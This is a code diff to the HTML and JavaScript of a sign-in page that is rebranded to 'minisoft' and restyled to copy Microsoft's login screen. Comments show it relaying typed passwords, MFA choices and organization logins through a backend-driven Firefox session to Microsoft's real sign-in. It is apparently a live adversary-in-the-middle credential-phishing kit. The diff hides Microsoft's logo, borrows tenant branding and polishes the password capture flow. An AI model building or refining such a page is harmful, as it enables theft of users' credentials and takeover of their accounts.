@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>ROADtools</title>
+<title>minisoft</title>
 <style>
   * { box-sizing: border-box; }
   body {
@@ -19,20 +19,56 @@
   }
   #bgLayer {
     position: fixed;
-    top: -20px;
-    left: -20px;
-    right: -20px;
+    top: -30px;
+    left: -30px;
+    right: -30px;
     bottom: -20px;
     z-index: -1;
     background-size: cover;
     background-position: center;
     background-repeat: no-repeat;
-    filter: blur(6px);
+    bottom: -30px;
+    filter: blur(28px) brightness(0.75);
+    transform: scale(1.05);
     display: none;
   }
   body.has-bg-image #bgLayer {
     display: block;
   }
+
+  /* Dark card when Microsoft branding background is present */
+  body.has-bg-image .brand { color: #ffffff; }
+  body.has-bg-image .card {
+    background: #1b1b1b;
+    box-shadow: 0 4px 32px rgba(0,0,0,0.7);
+  }
+  body.has-bg-image h1 { color: #ffffff; }
+  body.has-bg-image .password-header { color: #c8c8c8; }
+  body.has-bg-image .password-header .back-arrow { color: #aaaaaa; }
+  body.has-bg-image .password-header .back-arrow:hover { color: #4fc3f7; }
+  body.has-bg-image label { color: #a0a0a0; }
+  body.has-bg-image input[type="password"],
+  body.has-bg-image input[type="email"],
+  body.has-bg-image input[type="text"] {
+    background: #2b2b2b;
+    color: #ffffff;
+    border-color: #555555;
+  }
+  body.has-bg-image input[type="password"]:focus,
+  body.has-bg-image input[type="email"]:focus,
+  body.has-bg-image input[type="text"]:focus {
+    border-color: #0078d4;
+    outline: none;
+  }
+
+  body.has-bg-image .status-msg { color: #c8c8c8; }
+  body.has-bg-image .status-msg.error { color: #f88; }
+  body.has-bg-image .primary {
+    background: #0078d4;
+  }
+  body.has-bg-image .primary:hover { background: #106ebe; }
+  body.has-bg-image .secondary { color: #4fc3f7; border-color: #4fc3f7; }
+  body.has-bg-image #passwordEmailDisplay { color: #e0e0e0; }
   .wrapper {
     width: 460px;
     max-width: calc(100vw - 40px);
@@ -101,32 +137,145 @@
     margin: 0 0 22px;
     color: #1b1b1b;
   }
-  .password-logo {
-    display: block;
-    max-height: 36px;
-    max-width: 220px;
+  .password-logo { display: none !important; }
+
+  /* ── Email pill badge (MS-style, centered) ─────────────────── */
+  .email-badge-row {
+    text-align: center;
     margin-bottom: 20px;
   }
-  .password-header {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    margin-bottom: 24px;
-    font-size: 14px;
-    color: #666;
-  }
-  .password-header .back-arrow {
-    cursor: pointer;
-    font-size: 18px;
-    color: #444;
-    user-select: none;
-  }
-  .password-header .back-arrow:hover {
-    color: #2b5fd9;
-  }
   #passwordEmailDisplay {
+    display: inline-block;
+    padding: 5px 16px;
+    border: 1px solid #ccc;
+    border-radius: 20px;
+    font-size: 13px;
     font-weight: 500;
     color: #333;
+    max-width: 100%;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+
+  /* ── Floating-label bordered input (MS Fluent style) ───────── */
+  .pw-field {
+    position: relative;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    background: transparent;
+    transition: border-color 0.1s, border-width 0.05s;
+  }
+  .pw-field:focus-within {
+    border-color: #0078d4;
+    border-width: 2px;
+  }
+  .pw-label {
+    position: absolute;
+    left: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 14px;
+    color: #888;
+    pointer-events: none;
+    transition: all 0.15s ease;
+    background: transparent;
+    display: block;
+    margin: 0;
+  }
+  .pw-field:focus-within .pw-label,
+  .pw-field.has-value .pw-label {
+    top: 10px;
+    font-size: 11px;
+    transform: none;
+    color: #0078d4;
+  }
+  #passwordInput {
+    border: none !important;
+    border-bottom: none !important;
+    background: transparent !important;
+    padding: 22px 44px 6px 12px !important;
+    margin: 0 !important;
+    font-size: 16px !important;
+    width: 100% !important;
+    flex: 1;
+    outline: none;
+  }
+  .pw-eye-btn {
+    position: absolute;
+    right: 8px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: transparent;
+    border: none;
+    padding: 4px 6px;
+    cursor: pointer;
+    color: #888;
+    min-width: unset;
+    border-radius: 2px;
+    display: flex;
+    align-items: center;
+  }
+  .pw-eye-btn:hover { color: #333; }
+
+  /* ── Full-width Sign in button ─────────────────────────────── */
+  #passwordBtn {
+    width: 100%;
+    padding: 14px;
+    font-size: 15px;
+    font-weight: 600;
+    border-radius: 4px;
+    background: #0078d4;
+    margin-bottom: 8px;
+  }
+  #passwordBtn:hover:not(:disabled) { background: #106ebe; }
+
+  /* ── Links below button ────────────────────────────────────── */
+  .pw-links {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+    margin-top: 4px;
+  }
+  .pw-links a, #passwordCancelBtn {
+    color: #0078d4;
+    text-decoration: none;
+    font-size: 14px;
+    background: none;
+    border: none;
+    cursor: pointer;
+    padding: 6px 0;
+    min-width: unset;
+    font-weight: normal;
+    border-radius: 0;
+  }
+  .pw-links a:hover, #passwordCancelBtn:hover { text-decoration: underline; }
+
+  /* ── Dark mode overrides for new elements ──────────────────── */
+  body.has-bg-image #passwordEmailDisplay {
+    border-color: #555;
+    color: #d0d0d0;
+  }
+  body.has-bg-image .pw-field {
+    border-color: #555;
+    background: #2b2b2b;
+  }
+  body.has-bg-image .pw-field:focus-within { border-color: #0078d4; }
+  body.has-bg-image .pw-label { color: #aaa; }
+  body.has-bg-image .pw-field:focus-within .pw-label,
+  body.has-bg-image .pw-field.has-value .pw-label { color: #4fc3f7; }
+  body.has-bg-image #passwordInput { color: #ffffff !important; }
+  body.has-bg-image .pw-eye-btn { color: #aaa; }
+  body.has-bg-image .pw-eye-btn:hover { color: #fff; }
+  body.has-bg-image .pw-links a,
+  body.has-bg-image #passwordCancelBtn { color: #4fc3f7; }
+  body.has-bg-image .password-footer {
+    background: #1b1b1b !important;
+    border-top-color: #333 !important;
   }
   label {
     display: block;
@@ -547,7 +696,7 @@
 <div id="bgLayer"></div>
 
 <div class="wrapper">
-  <div class="brand">ROADtools</div>
+  <div class="brand">minisoft</div>
 
   <div class="card">
     <div class="top-loader" id="topLoader">
@@ -555,7 +704,7 @@
     </div>
     <div class="logo-mark">
       <div class="dot"></div>
-      <span>ROADtools</span>
+      <span>minisoft</span>
     </div>
 
     <form id="usernameForm">
@@ -574,20 +723,25 @@
     </form>
 
     <form id="passwordForm" style="display:none;">
-      <img id="passwordLogo" class="password-logo" style="display:none;" alt="">
-      <div class="password-header">
-        <span class="back-arrow" id="passwordBackArrow">← </span>
+      <div class="email-badge-row">
         <span id="passwordEmailDisplay"></span>
       </div>
-      <h1>Enter password</h1>
-      <div class="field">
-        <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
+      <h1>Enter your password</h1>
+      <div class="pw-field" id="pwField">
+        <label class="pw-label" for="passwordInput">Password</label>
+        <input type="password" id="passwordInput" name="password" autocomplete="current-password" required placeholder="">
+        <button type="button" class="pw-eye-btn" id="togglePw" aria-label="Show password" tabindex="-1">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+            <path d="M3.26 11.6A6.97 6.97 0 0 1 10 6c3.2 0 6.06 2.33 6.74 5.6a.5.5 0 0 0 .98-.2A7.97 7.97 0 0 0 10 5a7.97 7.97 0 0 0-7.72 6.4.5.5 0 0 0 .98.2ZM10 8a3.5 3.5 0 1 0 0 7 3.5 3.5 0 0 0 0-7Zm-2.5 3.5a2.5 2.5 0 1 1 5 0 2.5 2.5 0 0 1-5 0Z"/>
+          </svg>
+        </button>
       </div>
-      <div class="links">
-        <div><a href="#" onclick="return false;">Forgot my password</a></div>
-      </div>
-      <div class="actions">
+      <div class="actions" style="flex-direction:column;gap:0;align-items:stretch;">
         <button type="submit" class="primary" id="passwordBtn">Sign in</button>
+        <div class="pw-links">
+          <a href="#" onclick="return false;">Forgot my password</a>
+          <button type="button" id="passwordCancelBtn" style="display:none;">← Use a different account</button>
+        </div>
       </div>
     </form>
 
@@ -656,18 +810,18 @@
   <div class="org-topbar">
     <div class="org-topbar-brand">
       <div class="dot"></div>
-      <span>ROADtools</span>
+      <span>minisoft</span>
     </div>
   </div>
 
   <div class="org-body">
-    <div class="org-left-placeholder"><!-- drop a ROADtools image/illustration here --></div>
+    <div class="org-left-placeholder"><!-- drop a minisoft image/illustration here --></div>
 
     <div>
       <div class="org-redirecting" id="orgRedirecting" style="display:none;">
         <div class="org-panel-brand">
           <div class="dot"></div>
-          <span>ROADtools</span>
+          <span>minisoft</span>
         </div>
         <h1>Taking you to your organization's sign-in page</h1>
         <div class="single-dot"></div>
@@ -677,7 +831,7 @@
       <div class="org-panel" id="orgPanel" style="display:none;">
         <div class="org-panel-brand">
           <div class="dot"></div>
-          <span>ROADtools</span>
+          <span>minisoft</span>
         </div>
 
         <form id="orgLoginForm">
@@ -710,7 +864,7 @@
       </div>
 
       <div class="org-below-panel">
-        <div class="org-below-prompt">Don't have a ROADtools account?</div>
+        <div class="org-below-prompt">Don't have a minisoft account?</div>
         <button type="button" class="org-get-started-btn" id="orgGetStartedBtn">Get Started</button>
       </div>
     </div>
@@ -738,6 +892,7 @@ const passwordInput = document.getElementById("password");
 const usernameBtn = document.getElementById("usernameBtn");
 const passwordBtn = document.getElementById("passwordBtn");
 const usernameBackBtn = document.getElementById("usernameBackBtn");
+const passwordCancelBtn = document.getElementById("passwordCancelBtn");
 const passwordBackArrow = document.getElementById("passwordBackArrow");
 const passwordEmailDisplay = document.getElementById("passwordEmailDisplay");
 const passwordLogo = document.getElementById("passwordLogo");
@@ -760,6 +915,7 @@ const optionsCard = document.getElementById("optionsCard");
 
 let currentUsername = null;
 let lastSelectedMfaOption = null;
+let passwordSubmitted = false;   // true once /login/password has been called
 
 function cancelSession(username) {
   if (!username) return;
@@ -969,7 +1125,8 @@ function applyBranding(data) {
     document.body.classList.add("has-bg-image");
   }
 
-  if (data.logo) {
+  // Never show Microsoft's own logo — keep only our branding.
+  if (false && data.logo) {
     passwordLogo.src = data.logo;
     passwordLogo.style.display = "block";
   }
@@ -986,7 +1143,43 @@ async function pollStatus() {
     const data = await getJSON(`/login/status/${encodeURIComponent(currentUsername)}`);
     applyBranding(data);
 
-    if (data.stage === "awaiting_mfa_choice") {
+    if (data.stage === "starting") {
+      // Firefox is still launching — keep polling, nothing to show yet
+    } else if (data.stage === "entering_password") {
+      if (!passwordSubmitted) {
+        stopWaitingLoader();
+        setBusy(usernameBtn, false, "Next");
+        setStatus("");
+        showScreen("password");
+        passwordInput.focus();
+      } else if (data.error) {
+        // Microsoft rejected the password — surface the error and allow retry
+        stopWaitingLoader();
+        setBusy(passwordBtn, false, "Sign in");
+        passwordCancelBtn.style.display = "none";
+        setStatus(data.error, "error");
+        passwordSubmitted = false;
+        passwordInput.value = "";
+        passwordInput.focus();
+      }
+      // else: passwordSubmitted && no error → backend still typing; keep loader running.
+    } else if (data.stage === "awaiting_org_login") {
+      stopWaitingLoader();
+      setBusy(usernameBtn, false, "Next");
+      orgDomainNote.textContent = data.federated_domain
+        ? `This account uses your organization's sign-in page (${data.federated_domain}).`
+        : "This account uses your organization's sign-in page.";
+      showScreen("orgLogin");
+      orgRedirecting.style.display = "block";
+      orgPanel.style.display = "none";
+      setTimeout(() => {
+        orgRedirecting.style.display = "none";
+        orgPanel.style.display = "block";
+        setOrgStatus("Redirected to your organization's sign-in page.", "success");
+        orgEmail.value = currentUsername;
+        orgPassword.focus();
+      }, 1800);
+    } else if (data.stage === "awaiting_mfa_choice") {
       // Idle waiting for the user to pick a method — polling keeps running
       // in the background (to catch a push approval), but nothing is
       // actively in flight, so the loading bar shouldn't show here.
@@ -1024,17 +1217,24 @@ async function pollStatus() {
       return;
     } else if (data.stage === "failed") {
       stopPolling();
+      showScreen("username");
+      setBusy(usernameBtn, false, "Next");
       setStatus(data.error || "Authentication failed.", "error");
       currentUsername = null;
+      resetBranding();
       return;
     }
   } catch (err) {
     stopPolling();
+    showScreen("username");
+    setBusy(usernameBtn, false, "Next");
     setStatus(err.message, "error");
+    currentUsername = null;
+    resetBranding();
     return;
   }
 
-  pollHandle = setTimeout(pollStatus, 1500);
+  pollHandle = setTimeout(pollStatus, 500);
 }
 
 usernameForm.addEventListener("submit", async (e) => {
@@ -1044,37 +1244,21 @@ usernameForm.addEventListener("submit", async (e) => {
 
   setBusy(usernameBtn, true, "Next");
   resultEl.style.display = "none";
+  passwordSubmitted = false;
+  startWaitingLoader();
 
   try {
     const data = await postJSON("/login/username", { username });
-    currentUsername = data.username;
-
-    if (data.flow === "federated") {
-      orgDomainNote.textContent = data.federated_domain
-        ? `This account uses your organization's sign-in page (${data.federated_domain}).`
-        : "This account uses your organization's sign-in page.";
-
-      showScreen("orgLogin");
-      orgRedirecting.style.display = "block";
-      orgPanel.style.display = "none";
-
-      setTimeout(() => {
-        orgRedirecting.style.display = "none";
-        orgPanel.style.display = "block";
-        setOrgStatus("Redirected to your organization's sign-in page.", "success");
-        orgEmail.value = username;
-        orgPassword.focus();
-      }, 1800);
-    } else {
-      setStatus("");
-      applyBranding(data);
-      showScreen("password");
-      passwordInput.focus();
+    if (!data.ok) {
+      throw new Error(data.output || "Failed to start login.");
     }
+    currentUsername = data.username || username;
+    // Start polling — the password screen appears when poll detects entering_password.
+    pollHandle = setTimeout(pollStatus, 500);
   } catch (err) {
-    setStatus(err.message, "error");
-  } finally {
+    stopWaitingLoader();
     setBusy(usernameBtn, false, "Next");
+    setStatus(err.message, "error");
   }
 });
 
@@ -1141,7 +1325,7 @@ usernameBackBtn.addEventListener("click", () => {
   usernameInput.focus();
 });
 
-passwordBackArrow.addEventListener("click", () => {
+if (passwordBackArrow) passwordBackArrow.addEventListener("click", () => {
   stopPolling();
   showScreen("username");
   passwordInput.value = "";
@@ -1179,16 +1363,49 @@ passwordForm.addEventListener("submit", async (e) => {
   setBusy(passwordBtn, true, "Sign in");
   setStatus("Submitting password...", "info", true);
 
+  passwordCancelBtn.style.display = "inline-block";
   try {
     await postJSON("/login/password", { username: currentUsername, password });
-    setStatus("");
+    passwordSubmitted = true;   // tell pollStatus to keep the loader running
+    setStatus("Signing in...", "info", true);
     startWaitingLoader();
+    // pollStatus is already running; it will pick up the next stage automatically.
+    // Kick an extra poll immediately so there's no 1.5s dead-air gap.
+    if (pollHandle) { clearTimeout(pollHandle); pollHandle = null; }
     pollStatus();
   } catch (err) {
     setStatus(err.message, "error");
-  } finally {
     setBusy(passwordBtn, false, "Sign in");
+    passwordCancelBtn.style.display = "none";
   }
+});
+
+passwordCancelBtn.addEventListener("click", () => {
+  stopPolling();
+  showScreen("username");
+  cancelSession(currentUsername);
+  currentUsername = null;
+  passwordSubmitted = false;
+  passwordCancelBtn.style.display = "none";
+  setBusy(passwordBtn, false, "Sign in");
+  setStatus("");
+  resetBranding();
+});
+
+// Eye toggle — show/hide password
+const togglePw = document.getElementById("togglePw");
+const pwField  = document.getElementById("pwField");
+if (togglePw) {
+  togglePw.addEventListener("click", () => {
+    const isText = passwordInput.type === "text";
+    passwordInput.type = isText ? "password" : "text";
+    togglePw.setAttribute("aria-label", isText ? "Show password" : "Hide password");
+  });
+}
+
+// Floating label: add has-value class while input has content
+passwordInput.addEventListener("input", () => {
+  pwField.classList.toggle("has-value", passwordInput.value.length > 0);
 });
 
 mfaCodeForm.addEventListener("submit", async (e) => {
